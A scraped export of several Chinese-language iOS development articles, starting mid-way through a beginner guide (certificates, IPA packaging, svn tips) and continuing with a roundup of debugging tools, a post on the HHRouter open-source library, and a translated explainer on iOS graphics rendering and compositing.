<p>页面上有一个“Your Certificate”区域，下方有个Download圆角按钮，这是你的个人证书，下载下来。再下面一行，有一句“If you do not have the WWDR intermediate certificate installed, <a rel=""nofollow"" href=""https://developer.apple.com/certificationauthority/AppleWWDRCA.cer"">click here to download now</a>”，这个是苹果的公共证书，也下下来。</p>

<p>双击下载回来的证书，装证书时，会提示你输入密码，这是【钥匙串访问工具】在问你要你的Mac OS账号开机密码（相当于linux里面的sudo），不是Apple ID的密码，不要搞错了。</p>

<h5>安装私钥</h5>

<p>如果你是和其它同事公用的账号，让他给你一个私钥即可，就是一个扩展名为p12的文件，双击之，钥匙串访问会自动出来，需要你输入一个密码，这个密码问给你p12文件的人要，不是你的Mac OS系统开机密码，也不是你的Apple ID密码。</p>

<h4>将设备注册到Provisioning Portal</h4>

<ul>
<li>打开Xcode，从Xcode的Window菜单中找到Organizer，打开之（Shift Command 2）。</li>
<li>把iOS设备连上电脑，Organizer会自动识别出你的设备，并显示在左侧边栏。</li>
<li>在Organizer左侧边栏找到你的设备，右键，点击“Add Device to Provisioning Portal”，然后等Organizer提示你操作成功即可。（选中设备后，右边设备详情区域会显示一个按钮“Use for Development”，点它也可以）。</li>
</ul>
<h4>到iOS真机上运行测试版程序</h4>

<p>回到Xcode主界面，在Stop按钮（Run按钮右边那个黑色正方形按钮）右边，有个下拉菜单，显示着 “ToolBarSearch &gt; iPhone 5.0 Simulator” （即 你的应用英文名 &gt; 当前选中的调试 ），点击这个下拉菜单，选中你的真机设备名，再按“Run”按钮，Xcode就会自动把当前正在编辑开发的应用编译并安装到真机上测试啦！</p>

<h4>发布到App Store</h4>

<h4>打IPA包</h4>

<p>IPA包本质上是一个ZIP压缩包，只不过它有着特殊的目录结构，扩展名是ipa，制作方法如下：</p>

<ul>
<li>在Xcode中Build项目，快捷键Command B</li>
<li>在左侧项目导航器中，展开Products文件夹，找到你要打包的应用，你的应用名.app，右键，选择show in finder</li>
<li>到Finder中Copy这个.app目录（选中，按Command C），复制到一个你新建的名为Payload（区分大小写）的文件夹中</li>
<li>找到你的应用Logo，即一个512 * 512像素的PNG文件，copy到与Payload一起（与Payload并列，不要放进Payload了），并重命名为iTunesArtwork（区分大小写，没有扩展名）</li>
<li>将Payload目录、ItunesArtwork文件打成一个zip包，并更改扩展名为ipa</li>
<li>双击这个ipa文件，会用iTunes打开，如果打开成功，且在iTunes里有应用Logo显示，就成功了                </li>
</ul>
<h4>批量自动打包</h4>

<p>除App Store外，还有许多其它的iOS应用市场（如91助手，同步推等等），如果一个应用需要发布到很多个应用市场，且他们的代码略有不同（比如说，统计代码不同），按上述方法手工修改源码再打包，再还原，比较容易出错。好消息是，Xcode是有命令行的，我们可以写一个shell脚本，先用se自动修改源码，再调用Xcode的命令行来编译以得到your——app.app目录，最后调用zip、mv等命令把上一个章节讲的ipa打包动作自动执行。</p>

<h2>阅读应用代码</h2>

<h2>从头新建一个应用：Hello World</h2>

<h2>其它</h2>

<h3>代码里的控件尺寸</h3>

<p>iOS App里的控件尺寸和字体大小都是指Point，Retina设备（iPhone 4，4S，5；the new Pad）和非Retina设备（iPhone 3GS，iPad，iPad 2）的Point数是一样的，尽管iPhone 4的分辨率是3GS的2倍。比如说，10point在Retina设备里是20 pixel，在非Retina设备（iPhone 3G）上则是10 pixel。</p>

<p>项目成员间交流时，应使用Point，不要使用pixel。</p>

<h3>SVN操作含有@符号的文件</h3>

<p>iOS应用中经常出现xxxx@2x.png这样的文件名,它们是给retina设备用的高分辨率大图，用svn命令行操作它们的时候会被@符号干扰,解决方案是在svn命令末尾加上一个@符号,如:</p>

<pre><code>svn del icon@2x.png@
svn info Default@2x.png@
</code></pre>

<p>如果一次移动了几十个png文件再svn commit的,可以用shell批处理:</p>

<pre><code>svn status | awk '($1==""!""){print $2}' | grep -v @ | xargs svn del
</code></pre>

<p>上面这个命令是将文件名不包含@符号的,且已经不在硬盘上的文件从svn version controll中删掉</p>

<pre><code>for file in `svn status | awk '($1==""!""){print $2}' `; do svn del $file""@""; done     
</code></pre>

<p>上面这个命令是将文件名包含@符号的,且已经不在硬盘上的文件从svn version controll中删掉</p>

<p>svn add同上, 如法炮制即可.</p>

<h3>Xcode中的代码结构与操作系统上的文件系统并不一致</h3>

<p>推荐在Finder里建好目录再到Xcode的Project Navigator中点击“Add Files to”添加到项目中</p>

<h3>iPhone 5适配</h3>

<p>iPhone 5与之前的iPhone不一样，采用了4寸Retina屏，所以它的Point数变成了320 * 568 points</p>

<h3>开源代码</h3>

<ul>
<li><a rel=""nofollow"" href=""https://developer.apple.com/library/ios/navigation/#section=Resource%20Types&amp;topic=Sample%20Code"">Apple官方的Sample Code</a></li>
<li><a rel=""nofollow"" href=""http://en.wikipedia.org/wiki/List_of_free_and_open_source_iOS_applications"">维基百科上的开源iOS App</a></li>
<li>
<a rel=""nofollow"" href=""http://www.iosopensource.com/"">iOS Opensource</a> --Domain Parking了，以前可以下载Twitter和Wordpress客户端的</li>
<li><a rel=""nofollow"" href=""http://code4app.com/"">code 4 app</a></li>
<li>
<a rel=""nofollow"" href=""http://ui4app.com/"">UI 4 app</a>， code4app的姐妹站</li>
</ul>
<h3>Objective-C教程</h3>

<ul>
<li><a rel=""nofollow"" href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/ProgrammingWithObjectiveC/Introduction/Introduction.html"">Apple官方教程</a></li>
<li><a rel=""nofollow"" href=""http://cocoadevcentral.com/d/learn_objectivec/"">Cocoa Dev Center</a></li>
<li>
<a rel=""nofollow"" href=""http://zh.wikipedia.org/wiki/Objective-C"">维基上的Objective-C语言简介</a> --中文，十分钟可读完，推荐</li>
</ul>
<hr>
<p>via <a rel=""nofollow"" href=""http://blog.jobbole.com/65077/"">伯乐在线</a></p>

                ", iOS开发60分钟入门,1531972183,496,1,277,1,1,https://segmentfault.com/a/1190000000479589
192,1,0,6,"
                    
<p>在开发应用的时候，我们会碰到各种各样的bug，我们想要更好地了解到底发生了什么。然而不可预期的调试工作，总会浪费我们大量时间。本文介绍了七款诊断调试工具，可以从可以帮助我们对代码、UI界面等进行调试。</p>

<p>历时数周或数月开发出来了应用或游戏，可为什么体验不流畅？怎么能查出其中的纰漏？这些需要调试诊断工具从旁协助。调试是开发过程中必不可少的重要一环。本文会列举几个比较有效的调试诊断工具，可以帮助你寻根究底，以最快的速度发现、解决Bug。</p>

<h3><a rel=""nofollow"" href=""https://www.runscope.com/"">Runscope</a></h3>

<p>这是一家专注于API工具开发的公司，其创始人John Sheehan曾就职于IFTTT和Twilio。Runscope是一款集调试、测试于一身的网络服务，而且支持Ruby、Java、C#等多种语言。它可以捕捉请求，支持包括AFNetworking、HTTParty以及其他公共API的请求。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVb4i9"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
Runscope监控API请求</p>

<h3><a rel=""nofollow"" href=""https://github.com/robbiehanson/CocoaLumberjack"">Cocoa LumberJack</a></h3>

<p>Cocoa LumberJack是一个功能强大的NSlog，是通用的Cocoa日志框架之一。它可以提供更高级的log功能，比如记录log至文件或网络，并可根据log的级别（info、debug、warn、error）进行筛选。众所周知，NSlog虽然功能强大，但却普遍存在不支持分级别log、仅支持本地打印的问题，而且在大量处理log时，会降低程序运行效率。而Cocoa LumberJack则不存在这样的制约。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVb4ja"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<h3><a rel=""nofollow"" href=""http://simpholders.com/"">SimPholders</a></h3>

<p>SimPholders是一个快速简单的小工具，可以帮助开发者快速访问iPhone模拟器应用。它可以访问模拟器的文件夹，重置库和文件，以及删除选定的应用程序。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVb4jc"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<h3><a rel=""nofollow"" href=""https://github.com/domesticcatsoftware/DCIntrospect"">DCIntrospect</a></h3>

<p>DCIntrospect是一个UI布局调试库。利用它，你可以看到UI界面中每个元素的精确尺寸，还可水平或垂直拖动视图元素。与其相似的工具还有Spark Inspector和Revealapp，我们稍后也会介绍。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVb4jf"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<h3><a rel=""nofollow"" href=""https://github.com/square/PonyDebugger"">Pony Debugger</a></h3>

<p>Pony Debugger是由美国著名移动支付公司Square的iOS开发团队针对iOS开发的网络调试工具，它的名字来源于Square的Objective-C网络库PonyExpress。开发者可以利用它来调试应用的网络流量，并可以对应用的核心数据进行远程调试。通过注册管理对象，开发者可以浏览所有的实体、属性，利用Chrome的IndexedDB进行数据关系查询。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVb4ji"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<h3><a rel=""nofollow"" href=""http://sparkinspector.com/"">Spark Inspector</a></h3>

<p>Spark Inspector是一个UI界面调试工具，可利用3D形式展示视图元素，帮助你进行实时调试。同时，它还支持通知监视器，可以显示每个NSNotification、完整的堆栈跟踪信息、调用方法列表等。这个工具不是免费的，需要支付大约260元购买。不过，如果你感兴趣，官网还提供30天的免费试用版。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVb4jm"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p><a rel=""nofollow"" href=""http://revealapp.com/"">Revealapp</a></p>

<p>Revealapp可以让你以2D或3D的形式查看应用运行时的视图图层，快速调试视图层级和渲染问题。有时，应用的视图层级可能非常多，在Revealapp中，只需要双击视图界面，就可以将其拆分，便于浏览每个子视图。目前这款工具仍为Beta版，如果你感兴趣，不妨试试。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVb4jp"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<hr>
<p>转自 <a rel=""nofollow"" href=""http://www.csdn.net/article/2013-09-29/2817096-7-debug-tools-for-ios"">CSDN</a></p>

                ", 七款Debug工具推荐：iOS开发必备的调试利器,1531972185,526,1,964,1,1,https://segmentfault.com/a/1190000000454170
193,1,0,6,"
                    
<p>这周二，<a rel=""nofollow"" href=""http://huohua.in"">火花</a>开源了一个小项目 <a rel=""nofollow"" href=""https://github.com/Huohua/HHRouter"">HHRouter</a>，不到一周，已经获得不少关注。并且在 GitHub 的本日热门 Objective-C 项目榜中占据榜首连续两天，目前也在本周热门排列第四。尤其值得一提的是，关注者不仅有国内一线开发者，还包括 Twitter, Groupon, Airbnb 这类硅谷热门公司的工程师。</p>

<p>颇有成就感，撰文一篇纪念，也顺便聊聊 HHRouter 开源前后的一些事儿。</p>

<h3>URL Router</h3>

<p>HHRouter 背后的理念是 URL Router，这并不是新鲜的理念，早在数年前 Facebook 的 Three20 中就有类似的实现。但在 HHRouter 的传播过程中，我注意到还是有许多人对此并不了解。</p>

<p>一言以蔽之，URL Router 即将 UIViewController 映射成 URL，从而支持通过 URL 进行界面跳转。是的，就和 Web 一样。当然，这并不是 Web Developer 转职为 iOS Developer 后所做的无聊玩具。URL Router 有着许多切实的好处。</p>

<p>首先，这能够减少 UIViewController 之间的耦合。在没有 URL Router 的世界，如果 aViewController 需要跳转到 bViewController，就必须依赖于后者，这很容易就造成错综复杂的依赖链。引入 URL Router 后，这些链条自然就被斩断。</p>

<p>其次，当每个界面都拥有唯一且不重复的 URL ，将带来额外的好处。譬如，你将更容易实现这些需求：Push 打开指定的界面、追踪用户浏览记录、开放 URL Scheme。</p>

<p>再次，当你尝试引入 Hybrid 架构时，你会发现用统一语言描述 Web View 和 Native View 多么幸福。</p>

<h3>HHRouter</h3>

<p>刚才也有提到，URL Router 并不是新鲜的理念，那我们为什么重造一个轮子呢？</p>

<p>答案自然是对于现在的轮子不够满意。Three20 太臃肿自然不必再提，而其他 Router 也在设计或实现上有着不自然之处。</p>

<p>HHRouter 的设计哲学是 Clean, Fast &amp; Flexible。</p>

<p>HHRouter 不依赖于其他库，自己实现了一套简单的 Mapping 算法，核心代码只有 60 行。算法虽简单，但也做过专门优化，不像某些 Router，每次寻址就是做一次完整的遍历...</p>

<p>HHRouter 避免做太多事情，譬如对于界面跳转的控制，每个 App 都可能存在差异，HHRouter 就干脆放手不管。正因为心无旁骛，只做 URL Mapping，才能专心把这件事做好，做到极致。譬如对 <a rel=""nofollow"" href=""https://github.com/Huohua/HHRouter#url-query-params"">URL Query Params</a> 的支持，以及对 <a rel=""nofollow"" href=""https://github.com/Huohua/HHRouter#one-more-thing"">App 自定义 URL Scheme</a> 的支持。</p>

<h3>Marketing</h3>

<p>一些同学关心的问题是，HHRouter 是如何获得这么多关注的？</p>

<p>我在 Reddit, V2EX, Weibo, Twitter 上公布了 HHRouter 开源的消息，这带来了第一批的流量，让 HHRouter 进入了 GitHub Trending 页面，这又带来了后续的流量。</p>

<p>仅此而已，并非特地做过什么推广。问题的答案其实在前文就已提到。比起关心推广，不如将更多精力花在产品的定位与打磨。</p>

<h3>Open Source</h3>

<p>事实上，HHRouter 的主要代码都是在一年多前写的。此番只不过是做些整理。这不是单一的事件，而会是<a rel=""nofollow"" href=""http://huohua.in"">火花</a>拥抱开源的一个开始。</p>

<p>为什么要拥抱开源？推荐阅读这篇《<a rel=""nofollow"" href=""http://tom.preston-werner.com/2011/11/22/open-source-everything.html"">Open Source (Almost) Everything</a>》，作者 Tom Preston-Werner 是 GitHub Co-Founder。</p>

<p>引用文中我特别青睐的一段:</p>

<blockquote>
  <p>When I start a new project, I assume it will eventually be open sourced (even if it's unlikely). This mindset leads to effortless modularization. If you think about how other people outside your company might use your code, you become much less likely to bake in proprietary configuration details or tightly coupled interfaces. This, in turn, leads to cleaner, more maintainable code. Even internal code should pretend to be open source code.</p>
</blockquote>

<p>无论如何，请期待火花的更多开源作品 :)</p>

                ", HHRouter 开源后日谈,1531972186,496,1,262,1,1,https://segmentfault.com/a/1190000000443488
194,1,0,6,"
                    
<p><em>译注：这篇文章虽然比较长，但是里面的内容还是很有价值的。</em></p>

<p>像素是如何绘制到屏幕上面的？把数据输出到屏幕的方法有很多，通过调用很多不同的framework和不同的函数。这里我们讲一下这个过程背后的东西。希望能够帮助大家了解什么时候该使用什么API，特别是当遇到性能问题需要调试的时候。当然，我们这里主要讲iOS，但是事实上，很多东西也是可以应用到OSX上面的。</p>

<h3>Graphics Stack</h3>

<p>绘制屏幕的过程中又很多都是不被人了解的。但是一旦像素被绘制到屏幕上面，那么像素就是有3种颜色组成：红绿蓝。这3个颜色单元通过特定的强弱组合形成一个特定的颜色。对于iPhone5 <a rel=""nofollow"" href=""https://en.wikipedia.org/wiki/IPS_LCD"">IPS_LCD</a> 的分辨率是1,136×640 = 727,040个像素，也就是有2,181,120个颜色单元。对于一个15寸高清屏幕的MacBook Pro来说，这个数字差不多是1500万。Graphics Stack 就是确保每一个单元的强弱都正确。当滑动整个屏幕的时候，上百万的颜色单元需要在每秒60次的更新。</p>

<h3>The Software Components</h3>

<p>下面是一个简单的例子，整个软件看起来是这个样子：</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbNCf"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image""></span></p>

<p>显示器上面的就是GPU，图像处理单元。GPU是一个高度并发计算的硬件单元，特别是处理图形图像的并行计算。这就是为什么可以这么快的更新像素并输出到屏幕的原因。并行计算的设计让GPU可以高效的混合图像纹理。我们会在后面详细解释混合图像纹理这个过程。现在需要知道的就是GPU是被高度优化设计的，因此非常适合计算图像这种类型的工作。他比CPU计算的更快，更节约能耗。因为CPU是为了更一般的计算设计的硬件。CPU虽然可以做很多事情，但是在图像这方面还是远远慢于GPU。</p>

<p>GPU驱动是一些直接操作GPU的代码，由于各个GPU是不同的，驱动在他们之上创建一个层，这个层通常是OpenGL/OpenGL ES。</p>

<p>OpenGL（<a rel=""nofollow"" href=""http://en.wikipedia.org/wiki/OpenGL"">Open Graphics Library</a>）是用来做2D和3G图形图像渲染的API。由于GPU是一个非常定制化的硬件，OpenGL和GPU紧密合作充分发挥GPU的能力来实现图形图像渲染硬件加速。对大多数情况，OpenGL太底层了。但是当1992年第一个版本发布后（20多年前），它就成为主流的操作GPU的方式，并且前进了一大步。因为程序员再也不用为了每一个GPU编写不同的应用程序。</p>

<p>在OpenGL上面，分开了几个。iOS设备几乎所有的东西变成了Core Animation，但是在OSX，绕过Core Animation而使用Core Graphic 并不是不常见。有一些特别的应用程序，特别是游戏，可能直接使用OpenGL/OpenGL ES. 然后事情变得让人疑惑起来，因为有些渲染Core Animation 使用 Core Graphic。类似AVFoundation， Core Image 这样的框架，或是其他的一些混合的方式。</p>

<p>这里提醒一件事情， GPU是一个强有力的图形图像硬件，在显示像素方面起着核心作用。它也连接着CPU。从硬件方面讲就是有一些总线把他们连接了起来。也有一些框架比如 OpenGL， Core Animation。Core Graphic控制GPU和CPU之间的数据传输。为了让像素能够显示到屏幕上面，有一些工作是需要CPU的。然后数据会被传给GPU，然后数据再被处理，最后显示到屏幕上面。</p>

<p>每一个过程中都有自己的挑战，在这个过程中也存在很多权衡。</p>

<h3>硬件层</h3>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbNCg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image""></span></p>

<p>这是一个很简单的图表用来描述一个挑战。GPU有纹理（位图）合成为一帧（比如1秒60帧）每一个纹理占用VRAM（显卡）因此GPU一次处理的纹理有大小限制。GPU处理合成方面非常高效，但是有一些合成任务比其他要复杂，所以GPU对处理能力有一个不能超过16.7ms的限制（1秒60帧）。</p>

<p>另一个挑战是把数据传给GPU。为了让GPU能够访问数据，我们需要把数据从内存复制到显存。这个过程叫做上传到GPU。这个可能看上去不重要，但是对于一个大的纹理来说，会非常耗时。</p>

<p>最后CPU运行程序。你可能告诉CPU从资源文件夹中加载一个PNG图片，并解压。这些过程都发生在CPU。当需要显示这些解压的图片时，就需要上传数据到GPU。一些事情看似非常简单，比如显示一段文字，对CPU来说是一个非常复杂的任务。需要调用Core Text 和 Core Graphic框架去根据文字生成一个位图。完成后，以纹理的方式上传到GPU，然后准备显示。当你滑动或是移动一段屏幕上面的文字时，同样的纹理会被重用，CPU会简单的告诉GPU只是需要一个新的位置，所以GPU可以重新利用现有的纹理。CPU不需要重新绘制文字，位图也不需要重新上传到GPU。</p>

<p>上面的有一点复杂，在有一个整体概念之后，我们会开始解释里面的技术细节。</p>

<h3>图像合成</h3>

<p>图像合成的字面意思就是把不同的位图放到一起创建成最后的图像然后显示到屏幕上面。在很多方面来看，这个过程都是显而易见的，所以很容易忽视其中的复杂性和运算量。</p>

<p>让我们忽视一些特殊情况，假设屏幕上面都是纹理。纹理就是一个RGBA值的矩形区域。每一个像素包括红，绿，蓝，透明度。在Core Animation世界里面，基本上相当于CALayer。</p>

<p>在这个简单的假设中，每一个层是一个纹理，所有的纹理通过栈的方式排列起来。屏幕上的每一个像素，CPU都需要明白应该如何混合这些纹理，从而得到相对应的RGB值。这就是合成的过程。</p>

<p>如果我们只有一个纹理，而且这个纹理和屏幕大小一致。每一个像素就和纹理中得一个像素对应起来。也就是说这个纹理的像素就是最后屏幕显示的样子。</p>

<p>如果我们有另一个纹理，这个纹理覆盖在之前的纹理上面。GPU需要首先把第二个纹理和第一个纹理合成。这里面有不同的覆盖模式，但是如果我们假设所有的纹理都是像素对齐且我们使用普通的覆盖模式。那么最后的颜色就是通过下面的公式计算出来的。</p>

<pre><code>R = S + D * (1 - Sa)
</code></pre>

<p>最后的结果是通过源的颜色（最上面的纹理）加目标颜色（下面的纹理） 乘以（1 – 源颜色的透明度）公式里面所有的颜色就假定已经预先乘以了他们的透明度。</p>

<p>很显然，这里面很麻烦。让我们再假设所有的颜色都是不透明的，也就是alpha = 1. 如果目标纹理（下面的纹理）是蓝色的（RGB = 0，0，1）源纹理（上面的纹理）是红色（RGB = 1，0，0）。因为Sa = 1， 那么这个公式就简化为</p>

<pre><code>R = S
</code></pre>

<p>结果就是源的红色，这个和你预期一致。</p>

<p>如果源（上面的）层50%透明，比如 alpha = 0，5. 那么 S 的RGB值需要乘以alpha会变成 （0.5,0,0）。这个公式会变成这个样子</p>

<pre><code>                     0.5   0               0.5
R = S + D * (1 - Sa) = 0   + 0 * (1 - 0.5) = 0
                       0     1               0.5
</code></pre>

<p>我们最后得到的RGB颜色是紫色(0.5, 0, 0.5) 。这个和我们的直觉预期一致。透明和红色和蓝色背景混合后成为紫色。</p>

<p>要记住，这个只是把一个纹理中的一个像素和另一个纹理中的一个像素合成起来。GPU需要把2个纹理之间覆盖的部分中的像素都合成起来。大家都知道，大多数的app都有多层，因此很多纹理需要被合成起来。这个对GPU的开销很大，即便GPU已经是被高度硬件优化的设备。</p>

<h3>不透明 VS 透明</h3>

<p>当源纹理是完全不透明，最终的颜色和源纹理一样。这就可以节省GPU的很多工作，因为GPU可以简单的复制源纹理而不用合成所有像素值。但是GPU没有办法区别纹理中的像素是不透明的还是透明。只有程序员才能知道CALayer里面的到底是什么。这也就是CAlayer有opaque属性的原因。如果opaque = YES, 那么GPU将不会做任何合成计算，而是直接直接简单的复制颜色，不管下面还有什么东西。GPU可以减少大量的工作。这就是Instruments（Xcode 的性能测试工具）中 color blended layers 选项做的事情。（这个选项也在模拟器菜单里面）。它可以让你了解哪一个层（纹理）被标记成透明，也就是说，GPU需要做合成工作。合成不透明层要比透明的层工作量少很多，因为没有那么多的数学运算在里面。</p>

<p>如果你知道哪一个层是不透明的，那么一定确保opaque = YES。如果你载入一个没有alpha通道的image，而且在UIImageView显示，那么UIImageView会自动帮你设置opaque = YES。但是需要注意一个没有alpha通道的图片和每个地方的alpha都是100%的图片区别很大。后面的情况，Core Animation 需要假定所有像素的alpha都不是100%。在Finder中，你可以使用Get Info并且检查More Info部分。它将告诉你这张图片是否拥有alpha通道。</p>

<h3>像素对齐和不对齐</h3>

<p>到目前为止，我们考虑的层都是完美的像素对齐的。当所有的像素都对齐时，我们有一个相对简单的公式。当GPU判断屏幕上面的一个像素应该是什么时，只需要看一下覆盖在屏幕上面的所有层中的单个像素，然后把这些像素合成起来，或者如果最上面的纹理是不透明的，GPU只需要简单的复制最上面的像素就好了。</p>

<p>当一个层上面的所有像素和屏幕上面的像素完美对应，我们就说这个层是像素对齐的。主要有2个原因导致可能不对齐。第一个是放大缩小；当放大或是缩小是，纹理的像素和屏幕像素不对齐。另一个原因是当纹理的起点不在一个像素边界上。</p>

<p>这2种情况，GPU不得不做额外的计算。这个需要从源纹理中混合很多像素来创建一个像素用来合成。当所有像素对齐时，GPU就可以少做很多工作。</p>

<p>注意，Core Animation Instrument和模拟器都有color misaligned images 选项，当CALayer中存在像素不对齐的时候，把问题显示出来。</p>

<h3>遮罩（mask）</h3>

<p>一个层可以有一个和它相关联的遮罩。遮罩是一个有alpha值的位图，而且在合成像素之前需要被应用到层的contents属性上。当你这顶一个层为圆角时，一就在设置一个遮罩在这个层上面。然而，我们也可以指定一个任意的遮罩。比如我们有一个形状像字母A的遮罩。只有CALayer的contents中的和字母A重合的一部分被会被绘制到屏幕。</p>

<h3>离屏渲染（Offscreen rendering）</h3>

<p>离屏渲染可以被Core Animation 自动触发或是应用程序手动触发。离屏渲染绘制layer tree中的一部分到一个新的缓存里面（这个缓存不是屏幕，是另一个地方），然后再把这个缓存渲染到屏幕上面。</p>

<p>你可能希望强制离屏渲染，特别是计算很复杂的时候。这是一种缓存合成好的纹理或是层的方式。如果你的呈现树（render tree）是复杂的。那么就希望强制离屏渲染到缓存这些层，然后再使用缓存合成到屏幕。</p>

<p>如果你的APP有很多层，而且希望增加动画。GPU一般来说不得不重新合成所有的层在1秒60帧的速度下。当使用离屏渲染时，GPU需要合成这些层到一个新的位图纹理缓存里面，然后再用这个纹理绘制到屏幕上面。当这些层一起移动时，GPU可以重复利用这个位图缓存，这样就可以提高效率。当然，如果这些层没有修改的化，才能有效。如果这些层被修改了，GPU就不得不重新创建这个位图缓存。你可以触发这个行为，通过设置shouldRasterize = YES</p>

<p>这是一个权衡，如果只是绘制一次，那么这样做反而会更慢。创建一个额外的缓存对GPU来说是一个额外的工作，特别是如果这个位图永远没有被复用。这个实在是太浪费了。然而，如果这个位图缓存可以被重用，GPU也可能把缓存删掉了。所以你需要计算GPU的利用率和帧的速率来判断这个位图是否有用</p>

<p>离屏渲染也可以在一些其他场景发生。如果你直接或是间接的给一个层增加了遮罩。Core Animation 会为了实现遮罩强制做离屏渲染。这个增加了GPU的负担，因为一般上来，这些都是直接在屏幕上面渲染的。</p>

<p>Instrument的Core Animation 有一个叫做Color Offscreen-Rendered Yellow的选项。它会将已经被渲染到屏幕外缓冲区的区域标注为黄色(这个选项在模拟器中也可以用)。同时确保勾选Color Hits Green and Misses Red选项。绿色代表无论何时一个屏幕外缓冲区被复用，而红色代表当缓冲区被重新创建。</p>

<p>一般来说，你需要避免离屏渲染。因为这个开销很大。在屏幕上面直接合成层要比先创建一个离屏缓存然后在缓存上面绘制，最后再绘制缓存到屏幕上面快很多。这里面有2个上下文环境的切换（切换到屏幕外缓存环境，和屏幕环境）。</p>

<p>所以当你打开Color Offscreen-Rendered Yellow后看到黄色，这便是一个警告，但这不一定是不好的。如果Core Animation能够复用屏幕外渲染的结果，这便能够提升性能，当绘制到缓存上面的层没有被修改的时候，就可以被复用了。</p>

<p>注意，缓存位图的尺寸大小是有限制的。Apple 提示大约是2倍屏幕的大小。</p>

<p>如果你使用的层引发了离屏渲染，那么你最好避免这种方式。增加遮罩，设置圆角，设置阴影都造成离屏渲染。</p>

<p>对于遮罩来说，圆角只是一个特殊的遮罩。clipsToBounds 和 masksToBounds 2个属性而已。你可以简单的创建一个已经设置好遮罩的层创建内容。比如，使用已经设置了遮罩的图片。当然，这个也是一种权衡。如果你希望在层的contents属性这只一个矩形的遮罩，那你更应该使用contentsRect而不是使用遮罩。</p>

<p>如果你最后这是shouldRasterize = YES，记住还要设置rasterizationScale = contentsScale</p>

<h3>更多的关于合成</h3>

<p>通常，维基百科上面有许多关于图像合成的<a rel=""nofollow"" href=""https://en.wikipedia.org/wiki/Alpha_compositing"">背景知识</a>。我们这里简单的拓展一下像素中的红、绿、蓝以及alpha是如何呈现在内存中的。</p>

<h3>OSX</h3>

<p>如果你在OSX上面工作，你会发现大部分的这些调试选项在一个独立的叫做“Quartz Debug”的程序里面。而并不在 Instruments 中。Quartz Debug是Graphics Tools中的一部分，这可以在苹果的developer portal中下载到。</p>

<h3>Core Animation &amp; OpenGL ES</h3>

<p>就像名字所建议的那样，Core Animation 让我们可以创建屏幕动画。我们将跳过大部分的动画，关注于绘制部分。重要的是，Core Animation允许你坐高效的渲染。这就是为什么你可以通过Core Animation 实现每秒60帧的动画。</p>

<p>Core Animation 的核心就是基于OpenGL ES的抽象。简单说，它让你使用OpenGL ES的强大能力而不需要知道OpenGL ES的复杂性。当我讨论像素合成的时候，我们提到的层（layer）和 纹理（texture）是等价的。他们准确来说不是一个东西，但是缺非常类似。</p>

<p>Core Animation的层可以有多个子层。所以最后形成了一个layer tree。Core Animation做的最复杂的事情就是判断出那些层需要被绘制或重新绘制，那些层需要OpenGL ES 去合成到屏幕上面。</p>

<p>例如，当你这是一个layer的contents属性是一个CGImageRef时，Core Animation创建一个OpenGL 纹理，然后确保这个图片中的位图上传到指定的纹理中。或者，你重写了-drawInContext方法，Core Animation 会分配一个纹理，确保你的Core Graphics的调用将会被作用到这个纹理中。层的 性质和CALayer的子类会影响OpenGL渲染方式的效率。很多底层的OpenGL ES行为被简单的封装到容易理解的CALayer的概念中去。</p>

<p>Core Animation通过Core Graphics和OpenGL ES，精心策划基于CPU的位图绘制。因为Core Animation在渲染过程中处于非常重要的地位，所以如何使用Core Animation，将会对性能产生极大影响。</p>

<h3>CPU限制 vs GPU限制（CPU bound vs. GPU bound）</h3>

<p>当在屏幕上面显示的时候，有很多组件都参与其中。这里面有2个主要的硬件分别是CPU和GPU。P和U的意思就是处理单元。当东西被显示到屏幕上面是，CPU和GPU都需要处理计算。他们也都受到限制。</p>

<p>为了能够达到每秒60帧的效果，你需要确保CPU和GPU都不能过载。也就是说，即使你当前能达到60fps,你还是要尽可能多的绘制工作交给GPU做。CPU需要做其他的应用程序代码，而不是渲染。通常，GPU的渲染性能要比CPU高效很多，同时对系统的负载和消耗也更低一些。</p>

<p>因为绘制的性能是基于GPU和CPU的。你需要去分辨哪一个是你绘制的瓶颈。如果你用尽的GPU的资源，GPU是性能的瓶颈，也就是绘制是GPU的瓶颈，反之就是CPU的瓶颈。</p>

<p>如果你是GPU的瓶颈，你需要为GPU减负（比如把一些工作交给CPU），反之亦然。</p>

<p>如果是GPU瓶颈，可以使用OpenGL ES Driver instrument，然后点击 i 按钮。配置一下，同时注意查看Device Utilization % 是否被选中。然后运行app。你会看到GPU的负荷。如果这个数字接近100%，那么你交给GPU的工作太多了。</p>

<p>CPU瓶颈是更加通常的问题。可以通过Time Profiler instrument，找到问题所在。</p>

<h3>Core Graphics / Quartz 2D</h3>

<p>通过Core Graphics这个框架名字，Quartz 2D更被人所知。</p>

<p>Quartz 2D 有很多小功能，我们不会在这里提及。我们不会讲有关PDF创建，绘制，解析或打印。只需要了解答应PDF和创建PDF和在屏幕上面绘制位图原理几乎一致，因为他们都是基于Quartz 2D。</p>

